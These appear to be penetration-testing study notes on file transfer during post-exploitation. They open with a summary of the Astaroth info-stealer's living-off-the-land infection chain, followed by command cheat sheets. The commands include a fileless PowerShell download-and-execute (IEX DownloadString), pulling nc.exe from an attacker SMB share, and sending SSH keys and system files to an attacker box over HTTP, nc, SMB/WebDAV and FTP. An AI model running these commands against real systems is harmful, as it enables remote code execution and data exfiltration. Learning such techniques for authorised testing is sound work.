# Astaroth Attack
------------------
1. A spear-phishing email containing a .lnk file. When clicked, the .lnk file run a bat scripts that runs WMIC
2. WMIC downloads XSL file, hosting obfuscated JavaCript, which runs WMIC again
3. WMIC donwloads XSL file hosting obfuscated JavaScript, which uses the Bitsadmin, certutil and regsvr tool
4. Multiple instances of Bitsadmin download encoded payloads
5. certutil decodes payloads
6. decoded payloads is run with Regsvr32 and runs a second DLL -> loads third DLL. This DLL decrypts and injects another DLL into userinit
7. The DLL that's loaded into userinit is a proxu that reads, decrypts and reflectivly loads a final DLL, which is the info-stealer Astaroth

# Download Operations
----------------------------------------
### PowerShell Base64 Encode & Decode

- Pwnbox Check SSH key MD5 Hash
```bash
md5sum id_rsa
```

- Pwnbox Encode SSH Key to Base64
```bash
cat id_rsa | base64 -w 0; echo
```

- Copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
```powershell
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String($BASE64_STRING))
```

- Confirm the MD5 Hashes Match
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

**NOTE:** this may not work because some CMD has a maximum string length of 8191 characters. Also, a web sehll may error if we atteempt to send extremly large strings.

### PowerShell Web Downloads

- PowerShell DownloadFile Method
```powershell
# Net.WebClient
(New-Object Net.WebClient).DownloadFile($TARGET_FILE_URL, $OUTPUT_FILE_NAME)
	OR
(New-Object Net.WebClient).DownloadFileAsync($TARGET_FILE_URL, $OUTPUT_FILE_NAME)

	# Options
	DownloadFile: Downloads data from a resource to a local file
	DownloadFileAsync: Downloads data form a resource to a local file without blocking the calling thread.
```

- PowerShell DownloadString - Fileless Method
```powershell
# We run directly in memory using Invoke-Expression cmdlet (IEX)
IEX (New-Object Net.WebClient).DownloadString($URL)
	OR 
(New-Object Net.WebClient).DownloadString($URL) |IEX
```

- PowerShell Invoke-WebRequest
```powershell
Invoke-WebRequest $URL -OutFile $FILE_NAME
```

### SMB Downloads
------------------------------------
- Most likely, this does not work because new versions of Windows block unauthenticated guest access.
```bash
# Create SMB server
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Copy a File from the SMB Server
copy \\$IP\share\nc.exe
```

- Instead, we can do this:
```bash
# Create SMB Server with a Username and Password
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# Mount the SMB Server with Username and Password
net use n:\\$IP\share /user:test test
```

### FTP Downloads
-------------------
- Installing the FTP Server Python3 Module
```bash
sudo pip3 install pyftpdlib
```

- Set up Python3 FTP Server
```bash
sudo python3 -m pyftpdlib --port 21
```

- Perform File transfer from Windows/PowerShell using `Net.WebClient`
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://$IP/file.txt','ftp-file.txt')
```

- A lot of time, when we get a shell, we do not have an interative shell. If that's the case, we can create an FTP command file to donwload a file.
```bash
# Create a file
echo open $PWNBOX > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt

# Run the file
ftp -v -n -s:ftpcommand.txt
```


# Upload Operations
### PowerShell Base 64 endcode & Decode
- Encode File Using PowerShell
```powershell
# Encode 
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
# get the has to confirm the file on pwnbox
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
- Copty the content and paste it into pwnbox
```bash
echo $STRING | base64 -d > hosts
# Integrity
md5sum hosts
```

### PowerShell Web Uploads
```powershell
Invoke-FileUpload -Uri http://$PAWNBOX:8000/upload -File $FILE_NAME
```

### PowerShell Base64 Web Upload
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://$PAWNBOX:8000/ -Method POST -Body $b64

# Get the file on the pwnbox
nc -lnvp 8000
```

### SMB Uploads
- Install WebDav Python modules
```bash
sudo pip install wsgidav cheroot

# Use the module
suod wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
- Connect to the Webdav Share on target machine
```powershell
dir \\$PAWNBOX\\DavWWWRoot

# DavWWWRoot is a special keyword recognized by the Windows Shell, telling the Mini-Redirector driver (which handles WebDAV requests that you're connecting to the root of the WebDAV server)

Connect to a folder existing on the server:
dir \\$PAWNBOX\\sharefolder
```

- Upload Files using SMB
```powershell
copy $FILE \\$PWNBOX\DavWWWRoot\
	OR
copy $FILE \\$PWNBOX\sharefolder
```

### FTP Uploads
- Set up FTP server on pwnbox
```bash
sudo python3 -m pyftpdlib --port 21 --write
```

- PowerShell Upload File
```powershell
(New-Object Net.WebClient).UploadFile('ftp://$PWNBOX/ftp-hosts', $FILE_NAME)
```

- Create a command file for FTP
```bash
echo open $PWNBOX > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt

# Execute the file
ftp -v -n -s:ftpcommand.txt
```